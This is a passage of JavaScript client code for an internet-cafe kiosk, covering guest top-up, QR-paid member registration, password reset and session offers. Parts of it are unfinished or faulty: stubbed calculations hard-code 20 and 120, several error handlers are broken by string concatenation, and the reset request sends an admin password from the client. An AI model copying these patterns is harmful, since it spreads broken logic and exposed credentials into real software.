		}
		const reqData = {
			pc_name: thePCInfo.pc_name,
			member_account: 'Guest',
			mins: vueTopupLogin.topup_time
		}
		// const data = await theApiClient.callCafeApi('calculate/amount', 'POST', reqData).catch(ICafeApiError.skip)
		// if(data){
		// 	
		// }
		vueTopupLogin.topup_amount = 20;

	}, 1_000)


	this.topupLoginAmountCalculate = debounce(async function () {
		const reqData = {
			pc_name: thePCInfo.pc_name,
			member_account: 'Guest',
			topup_amount: vueTopupLogin.topup_amount
		}
		if (reqData['topup_amount'] == '' || reqData['topup_amount'] == null || reqData['topup_amount'] == 0) {
			return
		}
		const data = await theApiClient.callCafeApi('calculate/time', 'POST', reqData).catch(ICafeApiError.skip)
		if(data){
			
		}
		vueTopupLogin.topup_time = 120;

	}, 1_000)

	this.topup = async function (reqData) {
		if(vueTopupLogin.topup_amount < theSettings.mini_qr_payment){
			sweetAlert('912', translate_string('Please input mini amount')  + ' ' + theSettings.mini_qr_payment, 'warning');
			return
		}

		vueTopupLogin.resetOutputs();
		vueTopupLogin.clearErrors();
		vueGlobal.isLoading = true;
		const data = await theApiClient.callCafeApi('getTopupUrl','POST',reqData).catch(ICafeApiError.show + 'line 906').finally(()=>vueGlobal.isLoading = false)

		if (data?.result == 0) {
			// 检查是否是 promo code 相关的错误
			const promoCodeErrors = [
				'Promo code does not exist',
				'Promo code cannot be used for topup',
				'Promo code has expired',
				'Promo code has been used up',
				'Promo code has already been used'
			];

			const isPromoError = promoCodeErrors.some(error =>
				data.message && (data.message.includes(error) || data.message.includes(translate_string(error)))
			);

			if (isPromoError) {
				// 如果是 promo code 错误，显示在输入框下方
				vueTopupLogin.errors.promo_code = data.message || 'Wrong code';
			} else {
				// 其他错误使用弹窗显示
			sweetAlert('940', data.message, 'error');
			}
			return;
		}
		if (data.result == 1) {
			// 隐藏表单输入区域，显示简化信息
			vueTopupLogin.showFormRows = false;
			vueTopupLogin.showSummary = true;

			// 填充简化信息的值
			const memberEmail = vueTopupLogin.member_email || reqData.member_account || 'Max';
			const amount = vueTopupLogin.topup_amount || reqData.topup_amount || '$10';
			const minutes = vueTopupLogin.topup_time || '120';

			vueTopupLogin.summaryMember = memberEmail;
			vueTopupLogin.summaryAmount = (theSettings.currency ?? '$') + parseFloat(amount).toFixed(2);
			vueTopupLogin.summaryMinutes = minutes;

			// 显示扫码界面时，隐藏底部按钮
			vueTopupLogin.btn_group = false;

			vueTopupLogin.showPaymentQr = true;
			apply_topup_payment_view(vueTopupLogin, data, '.myModalTopupLogin #login_payment_qr');
		}
	}

	this.balance_login_submit = async function() {
		vueTopup.resetOutputs();
		vueTopup.clearErrors();

		const member_account = vueTopup.member_account;
		const topup_amount = vueTopup.topup_amount;
		const topup_time = vueTopup.topup_time;
		const promo_code = vueTopup.promo_code;

		let hasError = false;

		// Validation
		if (!member_account || member_account.trim() == '') {
			vueTopup.errors.member_account = translate_string('please input member account');
			hasError = true;
		}
		if (!topup_amount || topup_amount === '') {
			vueTopup.errors.topup_amount = translate_string('please input amount');
			hasError = true;
		} else if (topup_amount < theSettings.mini_qr_payment) {
			vueTopup.errors.topup_amount = translate_string('Please input mini amount') + ' ' + theSettings.mini_qr_payment;
			hasError = true;
		}

		if (hasError) {
			return false;
		}

		vueGlobal.isLoading = true;
		const data = await theApiClient.callCafeApi('getTopupUrl','post',{
			member_account: member_account,
			topup_amount: topup_amount,
			promo_code: promo_code,
			pc_name: thePCInfo.pc_name})
			.catch(ICafeApiError.show +'line 987')
		.finally(()=>{
				vueGlobal.isLoading = false;
			})

		if (typeof (data?.result) == 'undefined') {
			// API error handled by catch roughly, but if data is undefined/null need to stop
			return;
		}

		if (data.result == 0) {
			const promoCodeErrors = [
				'Promo code does not exist',
				'Promo code cannot be used for topup',
				'Promo code has expired',
				'Promo code has been used up',
				'Promo code has already been used'
			];
			const isPromoError = promoCodeErrors.some(error =>
				data.message && (data.message.includes(error) || data.message.includes(translate_string(error)))
			);

			if (isPromoError) {
				vueTopup.errors.promo_code = data.message || 'Wrong code';
			} else {
				sweetAlert('1025', data.message, 'error');
			}
			// return;
		}

		if (data.result == 1) {
			vueTopup.showFormRows = false;
			// showSummary logic in inline view is handled by v-show="!vueTopup.showFormRows"

			vueTopup.summaryMember = member_account;
			vueTopup.summaryAmount = (theSettings.currency ?? '$') + parseFloat(topup_amount).toFixed(2);
			vueTopup.summaryMinutes = topup_time;

			apply_topup_payment_view(vueTopup, data, '#inline_balance_qr');
		}
	}

	this.guest_login_submit = async function() {
		vueTopupLogin.resetOutputs();
		vueTopupLogin.clearErrors();

		const topup_memeber_email = vueTopupLogin.member_email;
		const topup_login_amount = vueTopupLogin.topup_amount;
		const topup_login_time = vueTopupLogin.topup_time;
		const promo_code = vueTopupLogin.promo_code;

		let hasError = false;

		// Validation
		if (!topup_memeber_email || topup_memeber_email.trim() == '') {
			vueTopupLogin.errors.member_email = translate_string('please input email');
			hasError = true;
		} else if (!/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(topup_memeber_email)) {
			vueTopupLogin.errors.member_email = translate_string('Invalid email format');
			hasError = true;
		}
		if (!topup_login_amount || topup_login_amount === '') {
			vueTopupLogin.errors.topup_amount = translate_string('please input amount');
			hasError = true;
		} else if (topup_login_amount < theSettings.mini_qr_payment) {
			vueTopupLogin.errors.topup_amount = translate_string('Please input mini amount') + ' ' + theSettings.mini_qr_payment;
			hasError = true;
		}
		if (topup_login_time === '' || topup_login_time == null) {
			vueTopupLogin.errors.topup_time = translate_string('please input minutes');
			hasError = true;
		}

		if (hasError) {
			return false;
		}

		if (!(await that.check_guest_promo_code()))
			return false;

		vueGlobal.isLoading = true;
		const data = await theApiClient.callCafeApi('memberAddGuest','POST',{
			topup_amount: topup_login_amount,
			member_email: topup_memeber_email,
			pc_name: thePCInfo.pc_name
		}).catch(ICafeApiError.show+'line 1072').finally(()=>{
			vueGlobal.isLoading = false;
		})
		if(!data) return null;

		const member_account = data?.member_account
		const reqData = {
			member_account: member_account,
			topup_amount: topup_login_amount,
			promo_code: promo_code,
			pc_name: thePCInfo.pc_name
		};

		if(vueTopupLogin.topup_amount < theSettings.mini_qr_payment){
			 sweetAlert('1099', translate_string('Please input mini amount')  + ' ' + theSettings.mini_qr_payment, 'warning');
			 return
		}

		vueGlobal.isLoading = true;
		const topupData = await theApiClient.callCafeApi('getTopupUrl','POST',reqData).catch(ICafeApiError.show + "line1078 xd").finally(()=>vueGlobal.isLoading = false)

		if (topupData?.result == 0) {
			const promoCodeErrors = [
				'Promo code does not exist',
				'Promo code cannot be used for topup',
				'Promo code has expired',
				'Promo code has been used up',
				'Promo code has already been used'
			];
			const isPromoError = promoCodeErrors.some(error =>
				topupData.message && (topupData.message.includes(error) || topupData.message.includes(translate_string(error)))
			);

			if (isPromoError) {
				vueTopupLogin.errors.promo_code = topupData.message || 'Wrong code';
			} else {
				sweetAlert('line1104', topupData.message, 'error');
			}
			// return;
		}

		if (topupData.result == 1) {
			vueTopupLogin.showFormRows = false;

			const memberEmail = vueTopupLogin.member_email || reqData.member_account || 'Max';
			const amount = vueTopupLogin.topup_amount || reqData.topup_amount || '$10';
			const minutes = vueTopupLogin.topup_time || '120';

			vueTopupLogin.summaryMember = memberEmail;
			vueTopupLogin.summaryAmount = (theSettings.currency ?? '$') + parseFloat(amount).toFixed(2);
			vueTopupLogin.summaryMinutes = minutes;

			apply_topup_payment_view(vueTopupLogin, topupData, '#inline_guest_qr');
		}
	}
}

function MemberLogin() {

	this.show_dialog = function () {
		var memberLoginUrl = "https://cp.icafecloud.com/shop/"+theCafe.license_name+"?dType=openDevice&dName="+thePCInfo.pc_name;
		if(theSettings.license_info.license_server_code == 'dev') {
			memberLoginUrl = "https://dev.icafecloud.com/shop/"+theCafe.license_name+"?dType=openDevice&dName="+thePCInfo.pc_name;
		}

		vueGlobal.modals.login = true;
		PetiteVue.nextTick(() => {
			const memberLoginEl = document.querySelector('.myModalMemberLogin #member_login');
			if (memberLoginEl) {
				memberLoginEl.innerHTML = '';
				new QRCode(memberLoginEl, memberLoginUrl);
			}
		});
	}

}

function MemberRegister() {
	this.show_dialog = function () {
		var memberRegisterUrl = "https://cp.icafecloud.com/shop/"+theCafe.license_name+"?dType=openDevice&dName="+thePCInfo.pc_name+"&icafe_id="+theCafe.id+"&request_type=register";
		if(theSettings.license_info.license_server_code == 'dev') {
			memberRegisterUrl = "https://dev.icafecloud.com/shop/"+theCafe.license_name+"?dType=openDevice&dName="+thePCInfo.pc_name+"&icafe_id="+theCafe.id+"&request_type=register";
		}

		vueGlobal.modals.scanRegister = true;
		PetiteVue.nextTick(() => {
			const container = document.querySelector('.myModalQRMemberRegister #member_register');
			if (container) {
				container.innerHTML = '';
				new QRCode(container, memberRegisterUrl);
			}
		});
	}

	/**
	 * 在主题的注册弹窗里插入「付款已到账 + 订单号」横幅。
	 *
	 * 这是本功能对主题 DOM 的唯一一处改动，主题的 login.htm 不写任何相关内容——新增主题时
	 * 零工作量，连仓库之外的 custom 主题也能直接吃到。扫码/终态两个界面走 swal（见
	 * show_offer_payment_swal / show_offer_stuck_swal），两个主题各自的 css/style.css 里都写了
	 * sweet-alert 的样式，所以它天然跟随主题，不需要 core 里有任何主题相关代码。
	 *
	 * 必须在 petite-vue 的 mount('body') 之前调用（见 main.js 的 initApp）：petite-vue 只在
	 * mount 那一刻编译一次 DOM，之后再 append 进去的节点永远不会被编译，v-show / {{}} 全是
	 * 死的。同理，这里插入的 .lang 会被 mount 时的 ui_init() 以及引导末尾那次
	 * translate_obj(document.body) 自动翻译，不需要手工补调。
	 *
	 * 对主题的要求只有两条，都是现有主题的自然形态；缺了只 console.warn 并跳过，绝不抛异常
	 * ——在 mount 之前抛出去会把整个 vue 应用打断、客户端白屏：
	 *   1. 注册弹窗根节点带 class myModalRegisterMember（core 别处早有依赖）
	 *   2. 其中有 #form-register-member 且至少一个 .modal-body：横幅插进它的开头。插在内部
	 *      而不是它前面，是为了跟表单字段处在同一个内容盒里，左右对齐由主题自己决定
	 */
	this.install_new_member_offer_ui = function () {
		try {
			const formBody = document.querySelector('.myModalRegisterMember #form-register-member .modal-body');
			if (!formBody) {
				console.warn('[new-member-offer] 找不到注册表单的 .modal-body，订单号横幅未插入');
				return;
			}
			if (formBody.querySelector('[data-nmo-banner]')) return;   // 幂等

			// 订单号要显眼：顾客关掉弹窗或断网就只能拿这个号去找店员，我们刻意不做本地保存
			//（产品决定），所以它是唯一的凭据。
			// 冒号写在 lang 元素之外——翻译 key 不带尾冒号，且 translate_obj 只翻译没有子节点的 .lang。
			const banner = document.createElement('div');
			banner.setAttribute('data-nmo-banner', '');
			banner.className = 'alert alert-success text-center py-2 mb-3';
			banner.setAttribute('v-show', 'vueRegister.claim_order_no');
			banner.innerHTML = '<div class="lang">Payment received. Please complete your registration</div>'
				+ '<div class="h5 mb-0 mt-1"><span class="lang">Order</span>: #{{vueRegister.claim_order_no}}</div>';
			formBody.insertBefore(banner, formBody.firstChild);
		} catch (e) {
			console.error('[new-member-offer] 订单号横幅插入失败', e);
		}
	}

	// 扫码相位。用 swal 而不是自己造一个 Bootstrap modal：两个主题都给 sweet-alert 写了样式，
	// 外观天然跟随主题；同一份代码也不用再去克隆主题的标题栏/按钮。做法照搬 shop.js 的
	// showPayOrder——先用 html:true 放一个空容器，弹出后再把节点 append 进去。
	function show_offer_payment_swal(data) {
		swal({
			title: translate_string('New member package'),
			text: '<div class="nmo-pay-box d-flex flex-column justify-content-center align-items-center"></div>',
			html: true,
			showConfirmButton: true,
			confirmButtonText: translate_string('Close'),
			showCancelButton: false,
			closeOnConfirm: true,
			allowOutsideClick: false,
		});

		const box = document.querySelector('.nmo-pay-box');
		if (!box) return;

		// 套餐名 / 金额 / 二维码 / 扫码提示 / 订单号。动态建的节点不在开机那次全量扫描范围内，
		// 每个 .lang 都要自己补一次 translate_obj。
		box.appendChild(build_line('New member package', vueRegister.offer_name));
		box.appendChild(build_line('Amount', vueRegister.offer_amount));
		box.appendChild(build_payment_qr_element(data));

		const hint = document.createElement('div');
		hint.className = 'text-center mt-2 text-muted lang';
		hint.innerText = 'Please scan this QR code with your phone';
		translate_obj(hint);
		box.appendChild(hint);

		box.appendChild(build_line('Order', '#' + vueRegister.claim_order_no, 'mt-2 small text-muted'));

		// swal 是 position:fixed + overflow:hidden + max-height:none，内容一高就顶出视口且
		// 不能滚动，顾客够不到下面的 Close 按钮（实测 manual 网关那张收款码图就会超出）。
		// 这里把内容区限高并让它自己滚，保证按钮永远在视口里。
		// 高度用 vh 是 Bootstrap 工具类覆盖不到的精确尺寸，只能内联；overflow 同理
		//（这份 bootstrap.css 里没有 .overflow-auto）。网关图片用 img-fluid 收进容器宽度。
		box.style.maxHeight = '55vh';
		box.style.overflowY = 'auto';
		box.querySelectorAll('img').forEach(img => img.classList.add('img-fluid'));

		// sweetalert 的垂直居中是「弹出那一刻」按当时高度算出来的 margin-top，而我们是弹出之后
		// 才把内容 append 进去的（QRCode 必须往活节点里画，没法先拼好字符串交给 swal），
		// 于是居中值偏小、整个弹窗被顶下去，Close 按钮露在视口外面还点不到。按最终高度重算一次。
		const sw = document.querySelector('.sweet-alert');
		if (sw) sw.style.marginTop = (-sw.offsetHeight / 2) + 'px';

		copyToClipboard(box, {
			toast: true,
			text: () => {
				const url = data.payment_url ?? data.url ?? '';
				return /^http/i.test(url) ? url : '';
			},
			container: box,
		});
	}

	// 终态：轮询超时或订单被店员取消。绝不放顾客进表单——那样会填完才失败。
	function show_offer_stuck_swal(message) {
		swal({
			title: translate_string('Order') + ': #' + vueRegister.claim_order_no,
			text: message || '',
			type: 'warning',
			confirmButtonText: translate_string('Close'),
			closeOnConfirm: true,
			allowOutsideClick: false,
		});
	}

	// 「标签: 值」一行。标签走 .lang + translate_obj，冒号写在 lang 元素之外
	// （翻译 key 不带尾冒号，且 translate_obj 只翻译没有子节点的 .lang）。
	function build_line(label_key, value, css) {
		const row = document.createElement('div');
		row.className = css || 'mb-1';
		const label = document.createElement('span');
		label.className = 'lang';
		label.innerText = label_key;
		translate_obj(label);
		row.appendChild(label);
		row.appendChild(document.createTextNode(': '));
		const val = document.createElement('span');
		val.className = 'font-weight-bold';
		val.innerText = value ?? '';
		row.appendChild(val);
		return row;
	}

	// 配了新会员套餐、且这个套餐要收钱。判据用**原价** product_price，不能用 price_qr——
	// price_qr 是套过 QR 附加费的实收价，原价 0 的套餐碰上网吧配了 qr_fixed_fee 会算出一个
	// 凭空的金额（线上真实出现过免费套餐被要求付 4 块），拿它判断会把免费套餐误判成收费的。
	function is_paid_new_member_offer() {
		const offer = window.theNewMemberOffer;
		return !!(offer && offer.product_id && parseFloat(offer.product_price ?? 0) > 0);
	}

	this.show_client_register = function () {
		// 已经付过款、但表还没填完就把弹窗关掉了：直接回到表单，绝不能再下一张单——
		// 那等于让顾客付第二次钱。两个主题的标题栏都有一颗 × 能关掉弹窗，这条路走得通。
		if (vueRegister.phase === 'form' && vueRegister.claim_order_no) {
			vueGlobal.modals.register = true;
			return;
		}

		// 回到初始相位并清掉上一次的二维码/轮询，否则再次打开弹窗会看到上一个人的付款码
		var prev_order_no = vueRegister.claim_order_no;
		var prev_claim_token = vueRegister.claim_token;
		vueRegister.resetOutputs();

		// 配了**收费**的新会员套餐：先收钱再填表。这时候不开注册弹窗，先弹扫码的 swal，
		// 付款到账后（on_offer_paid）才把注册弹窗放出来。
		// 免费套餐（原价 0，有些网吧确实这么配）不走这条路，直接进表单——后端注册时
		// 余额 0 >= 原价 0 成立，会走余额分支 0 元建单并绑定套餐，不需要任何付款。
		if (is_paid_new_member_offer()) {
			theMemberRegister.start_offer_payment(prev_order_no, prev_claim_token);
			return;
		}

		vueGlobal.modals.register = true;
	}

	// 下单出码，弹出扫码 swal。
	// prev_* 是本次之前这位顾客自己那张还没付款的单——传回服务端让它先作废，
	// 否则「点开→改主意→再点开」每点一次都会吃掉一个限流名额。
	this.start_offer_payment = function (prev_order_no, prev_claim_token) {
		vueGlobal.isLoading = true;
		theApiClient.callCafeApi('newMemberOfferPay', 'POST', {
			pc_name: thePCInfo.pc_name,
			prev_order_no: prev_order_no || '',
			prev_claim_token: prev_claim_token || '',
		}).then((data) => {
			vueRegister.phase = 'qr';
			vueRegister.claim_order_no = data.order_no ?? '';
			vueRegister.claim_token = data.claim_token ?? '';
			vueRegister.offer_name = data.offer_name ?? '';
			vueRegister.offer_amount = (data.offer_currency ?? theSettings.currency ?? '$') + parseFloat(data.offer_amount ?? 0).toFixed(2);
			show_offer_payment_swal(data);

			// 与 WSS 并联的轮询，不是超时后才启用的兜底：这条路上丢一帧 WSS 就是顾客付了钱、
			// 界面却永远停在二维码。两边都调 on_offer_paid()，那个函数是幂等的。
			vueRegister.poll_timer = poll_topup_status(data, {
				intervalMs: 5_000,
				maxMs: 20 * 60_000,   // 与服务端 getTopupStatus 给 QR_FOR_OFFER 的窗口一致
				onPaid: () => theMemberRegister.on_offer_paid(data.order_no),
				onCancelled: () => theMemberRegister.on_offer_stuck(translate_string('This payment was cancelled, please ask staff for help')),
				onGiveUp: () => theMemberRegister.on_offer_stuck(translate_string('If you have paid, please show this order number to the staff')),
			});
		}).catch(ICafeApiError.show + 'line1355').finally(() => {
			vueGlobal.isLoading = false;
		});
	}

	// 付款到账，关掉扫码 swal、放出注册弹窗（表单顶部会显示订单号横幅）。
	// 幂等：WSS 和轮询可能同时到达，也可能重复到达，只有第一次生效。
	this.on_offer_paid = function (order_no) {
		if (vueRegister.phase !== 'qr') return;
		if (order_no && vueRegister.claim_order_no && String(order_no) != String(vueRegister.claim_order_no)) return;
		if (vueRegister.poll_timer) {
			// poll_topup_status 返回的是取消函数，不是计时器 id
			vueRegister.poll_timer();
			vueRegister.poll_timer = null;
		}
		vueRegister.phase = 'form';
		swal.close();
		vueGlobal.modals.register = true;
	}

	// 轮询超时或订单被取消：停在终态并让顾客拿订单号找店员。
	// 绝不能假装付款成功放他进表单——那样会填完表提交时才失败，体验更差。
	this.on_offer_stuck = function (message) {
		if (vueRegister.phase !== 'qr') return;
		vueRegister.poll_timer = null;
		vueRegister.phase = 'stuck';
		vueRegister.claim_message = message || '';
		// 直接再开一个 swal 就会替换掉当前那个，不用先 close
		show_offer_stuck_swal(vueRegister.claim_message);
	}

	this.show_club_rules = function () {
		vueGlobal.modals.clubRules = true;
	}

	// 客户端跑在 libcef 里，原生 <select> 弹出的下拉列表依赖单独的 OS 弹出窗口，
	// 离屏渲染下不会显示（普通浏览器里没问题），所以 Gender 改用纯 Vue 状态驱动的自定义下拉，
	// 跟 guest-topup-selectable 那套一样不依赖任何原生弹出控件
	this.toggle_gender_menu = function () {
		vueRegister.sexMenuOpen = !vueRegister.sexMenuOpen;
	}

	this.close_gender_menu = function () {
		vueRegister.sexMenuOpen = false;
	}

	this.select_gender = function (value) {
		vueRegister.sex = value;
		this.close_gender_menu();
	}

	// 自定义下拉不是原生表单控件，不能依赖 select 的 required 属性触发浏览器校验，提交前手动校验一次
	this.validate_gender = function () {
		if (vueGlobal.memberSettings.member_sex == 1 && vueRegister.sex === '') {
			sweetAlert("1422", translate_string('please select gender'), "error");
			return false;
		}
		return true;
	}

	this.show_personal_data = function () {
		vueGlobal.modals.personalData = true;
	}

	this.submit = function()
	{
		// 清除所有错误状态（使用 Vue 状态）
		vueRegister.clearErrors();

		const theIsSmsSwitch = theSettings.sms_enable ?? false;
		var account = vueRegister.account;
		var birthday = vueRegister.birthday;
		var password = vueRegister.password;
		var confirm_password = vueRegister.confirm_password;
		var first_name = vueRegister.first_name;
		var last_name = vueRegister.last_name;
		var phone = vueRegister.phone;
		var email = vueRegister.email;
		var promo_code = vueRegister.promo_code;
		var member_sms_code = vueRegister.member_sms_code;
		var id_card = vueRegister.id_card;
		var sex = vueRegister.sex;
		let hasError = false;

		// 验证 Account
		if (!account || account.trim() == '') {
			vueRegister.errors.account = translate_string('please input account');
			hasError = true;
		}

		// 验证 Password
		if (!password || password.trim() == '') {
			vueRegister.errors.password = translate_string('please input password');
			hasError = true;
		}

		// 验证 Confirm Password
		if (!confirm_password || confirm_password.trim() == '') {
			vueRegister.errors.confirm_password = translate_string('please input confirm password');
			hasError = true;

		} else if (password != confirm_password) {
			vueRegister.errors.confirm_password = translate_string("The new password and confirm password do not match!");
			hasError = true;
		}

		// 验证 Phone 格式
		const phoneRegex = /^(\+[1-9]\d{1,14}|[0-9]{5,15})$/;
		if (phone && !phoneRegex.test(phone)) {
			vueRegister.errors.phone = translate_string('Phone number must contain digits only, with an optional + and country code, no spaces or dashes');
			hasError = true;
		}

		// 验证 Email 格式
		const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
		if (email && !emailRegex.test(email)) {
			vueRegister.errors.email = translate_string('Invalid email format');
			hasError = true;
		}

		if (hasError) {
			sweetAlert("1489", vueRegister.errors.account || vueRegister.errors.password || vueRegister.errors.confirm_password || vueRegister.errors.phone || vueRegister.errors.email, "error");
			return false;
		}

		const subCallForm = function () {
			vueRegister.isSubmitting = true;
			vueGlobal.isLoading = true;
			// Disabled handled by loading state
			theApiClient.callCafeApi('clientMemberRegister','POST',{
					pc_name: thePCInfo.pc_name,
					account: account,
					birthday: birthday,
					password: password,
					first_name: first_name,
					last_name: last_name,
					phone: phone,
					email: email,
					promo_code: promo_code,
					id_card: id_card,
					sex: sex,
					// 已经付过款的新会员套餐单：把单号和认领凭据带回去，服务端建号之后
					// 才能把这张单挂到他名下并发放套餐。没配套餐时两个都是空串，后端忽略。
					order_no: vueRegister.claim_order_no,
					claim_token: vueRegister.claim_token,
				}).then(()=>{
					vueGlobal.modals.register = false;
					// 这张单已经认领掉了，凭据必须清空：否则下一位顾客点 Register 会被
					// show_client_register 里那条"已付款待认领"的早返回挡在表单上，永远出不了码。
					vueRegister.claim_order_no = '';
					vueRegister.claim_token = '';
					sweetAlert("1519", translate_string("Succeed"), "success");
				}).catch(ICafeApiError.show).finally(()=>{
					vueGlobal.isLoading = false;
				vueRegister.isSubmitting = false;
				})
		}

		if (theIsSmsSwitch == 1 && vueGlobal.memberSettings.member_phone == 1) {//等于1表示开启手机短信验证
			if (!member_sms_code) {
				sweetAlert("1528", translate_string("Please enter the SMS verification code!"), "error");
				return false;
			} else {
				// 输入的code发起对比是否一致
				SmsClassFun.verifySmscode(function (result) {
					if (result.code && result.code == 200) {
						subCallForm();
					} else {
						sweetAlert("1536", translate_string(result && result.message ? result.message : 'SMS verification code mismatch'), "error");
						return false;
					}
				})
			}
		} else {
			subCallForm();
		}
	}
}

function ForgotPassword() {
	var that = this;

	this.show_dialog = function () {

		vueForgotPassword.phone_number = '';
		vueForgotPassword.email = '';

		vueGlobal.modals.forgotPassword = true;
	}

	this.submit_form = function() {
		let way = theSettings?.client_reset_password_way ?? 0;
		if (! [RESET_PASSWORD_SMS, RESET_PASSWORD_EMAIL].includes(way)) {
			return;
		}

		let verify_result = way == RESET_PASSWORD_SMS ? that.verify_phone_number() : that.verify_email();
		if (! verify_result) {
			return;
		}

		// Refactored to use theApiClient
		const memberCheckUrl = 'memberResetPwd'; // API endpoint name mapping might differ, checking helper.js or assuming standard
		// helper.js uses getCafeApiUrl('memberResetPwd', 'auth').
		// let's try calling callCafeApi or callApi directly.
		// callCafeApi usually prefixes 'shop/<license>/'
		// getCafeApiUrl('memberResetPwd', 'auth') -> auth/memberResetPwd ?

		let url = theApiClient.getServerUrl('auth/memberResetPwd'); // Guessing based on previous pattern

		vueGlobal.isLoading = true;
		theApiClient.callApi(url, 'POST', {
			phone_number: vueForgotPassword.phone_number,
			email: vueForgotPassword.email,
			reset_password_way: theSettings.client_reset_password_way ?? 0,
			license_name: theCafe.license_name,
			apwd: theSettings.admin_password,
			pc_name: thePCInfo.pc_name,
		}).then((data) => {
			vueGlobal.modals.forgotPassword = false;
			let message = way == RESET_PASSWORD_SMS
				? translate_string("Your new password has been sent to your phone")
				: translate_string("Your new password has been sent to your email");
			sweetAlert("1591", message, "success");
		}).catch((e) => {
			let message = e?.message || translate_string('Failed to verify')
			sweetAlert('1594', message, 'error');
		}).finally(() => {
			vueGlobal.isLoading = false;
		});
	}

	this.verify_email = function() {
		if (!vueForgotPassword.email) {
			sweetAlert('1602', translate_string('Please enter your email'), 'error');
			return false;
		}

		const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
		if (!emailRegex.test(vueForgotPassword.email)) {
			sweetAlert('1608', translate_string('Invalid email format'), 'error');
			return false;
		}

		return true;
	}

	this.verify_phone_number = function() {

		if (!vueForgotPassword.phone_number) {
			sweetAlert('1618', translate_string('Please enter your phone number'), 'error');
			return false;
		}

		const phoneRegex = /^(\+[1-9]\d{1,14}|[0-9]{5,15})$/;
		if (!phoneRegex.test(vueForgotPassword.phone_number)) {
			sweetAlert('1624', translate_string('Phone number must contain digits only, with an optional + and country code, no spaces or dashes'), 'error');
			return false;
		}

		return true;
	}
}

function StartSession()
{
	var that = this;

	// start-session 阶段暂存的会员账号，用于 is_member_logined() 判断支付路径
	// logout() 时需清空；WSS client_status 到达后 currentView 离开 start-session，自动失效
	this.member_account = '';

	this.show = async function () {
		// Buttons enabled state bound to vueGlobal.isLoading
		await refreshBalanceInfo(memberInfo.member_name)

		//$('#page_login').removeClass('d-flex').hide();
		//$('#page_games').removeClass('d-flex').hide();
		//$('#page_start_session').addClass("d-flex").show();
		vueGlobal.currentView = 'start-session';
		vueGlobal.offerPage = 0;
		vueGlobal.availableOfferPage = 0;

		that.load_offers()
		await that.fetch_available_offers(false, true)

		PetiteVue.nextTick(() => {
			ui_init();
			$('[data-toggle="tooltip"]').tooltip();
		});
	}

	this.start = async function (billing_source) {
		vueGlobal.isLoading = true;
		await theApiClient.callCafeApi('clientStartSession', 'POST', {
			member_account: memberInfo.member_name,
			// pc_name: thePCInfo.pc_name,
			billing_source: billing_source,
		}).catch(function(e){
			ICafeApiError.show(e);
		}).finally(function() {
			vueGlobal.isLoading = false;
		});
	}

	this.buy_offer = function (item) {
		theShop.order_items = [];
		theShop.order_items.push({
				product_id: item.product_id,
				product_name: item.product_name,
				product_description: item.product_description || '',
				product_price: item.product_price,
				product_tax_id: item.product_tax_id ?? 0,
				product_enable_discount: item.product_enable_discount ?? 0,
				product_is_offer: true,
				order_item_qty: 1,
		});
		// 会员买 offer 默认选余额支付，以便 modal 打开时立即显示 bonus 明细
		if (is_member_logined() && vueOrderItems.payment_method === -1) {
			vueOrderItems.payment_method = PAY_METHOD_BALANCE;
		}
		theShop.cart_refresh();
		vueGlobal.modals.buy = true;
	}

	this.load_offers = function() {
		if (theSettings.license_using_billing != 1) {
			return;
		}
		var filtered_items = [];
		theProductList.forEach(function(obj) {
			// -1的代表的是offer
			if (obj.product_group_id != -1) {
				return;
			}

			// 取消 obj.product_group_id == -1 判断，因为常规产品也支持show_weekday、show_time; -1的代表的是offer
			// pc group, member group
			var pc_group_id = thePCStatus.pc_group_id ?? 0
			var member_group_id = thePCStatus.member_group_id ?? 0
			if (JSON.parse(obj.product_pc_groups).indexOf('0') < 0 && JSON.parse(obj.product_pc_groups).indexOf(pc_group_id.toString()) < 0)
				return;

			if (JSON.parse(obj.product_member_groups).indexOf('0') < 0 && JSON.parse(obj.product_member_groups).indexOf(member_group_id.toString()) < 0)
				return;

			// empty or "7|1|2|3|4|5|6"
			var todayAvailable = true;
			var yesterdayAvailable = true;
			var product_show_weekday = (typeof(obj.product_show_weekday) != 'undefined' ? obj.product_show_weekday : '');
			if (product_show_weekday.length > 0) {
				var weekdays = product_show_weekday.split('|');
				if (weekdays.indexOf(moment().format('E')) < 0)
					todayAvailable = false;
				if (weekdays.indexOf(moment().add(-1, 'days').format('E')) < 0)
					yesterdayAvailable = false;
				if (!todayAvailable && !yesterdayAvailable)
					return;
			}

			// empty or 00:00-24:00
			var product_show_time = (typeof(obj.product_show_time) != 'undefined' ? obj.product_show_time : '');
			if (product_show_time.length > 0) {
				var times = product_show_time.split('-');
				if (times.length != 2)
					return;

				var begin_times = times[0].split(':');
				var end_times = times[1].split(':');
				if (begin_times.length != 2 || end_times.length != 2)
					return;

				var begin = moment().set({ 'hour': parseInt(begin_times[0]), 'minute': parseInt(begin_times[1]), 'second': 0 });
				var end = moment().set({ 'hour': parseInt(end_times[0]), 'minute': parseInt(end_times[1]), 'second': 0 });
				if (end >= begin) {
					if (!todayAvailable)
						return;
					if (begin.isAfter() || end.isBefore())
						return;
				}

				// if like 23:00-08:00 over mid-night
				if (end < begin) {
					let isValid = ((begin.isBefore() && todayAvailable) || (yesterdayAvailable && end.isAfter()));
					if (!isValid)
						return;
				}
			}

			// empty or "7|1|2|3|4|5|6"
			var today_enable = true;
			var yesterday_enable = true;
			var product_enable_weekday = (typeof(obj.product_enable_weekday) != 'undefined' ? obj.product_enable_weekday : '');
			if (product_enable_weekday.length > 0) {
				var weekdays = product_enable_weekday.split('|');
				if (weekdays.indexOf(moment().format('E')) < 0)
					today_enable = false;
				if (weekdays.indexOf(moment().add(-1, 'days').format('E')) < 0)
					yesterday_enable = false;
				if (!today_enable && !yesterday_enable)
					return;
			}

			// empty or 00:00-24:00
			var product_enable_time = (typeof(obj.product_enable_time) != 'undefined' ? obj.product_enable_time : '');
			if (product_enable_time.length > 0) {
				var enable_times = product_enable_time.split('-');
				if (enable_times.length != 2)
					return;

				var begin_enable_times = enable_times[0].split(':');
				var end_enable_times = enable_times[1].split(':');
				if (begin_enable_times.length != 2 || end_enable_times.length != 2)
					return;

				var begin = moment().set({ 'hour': parseInt(begin_enable_times[0]), 'minute': parseInt(begin_enable_times[1]), 'second': 0 });
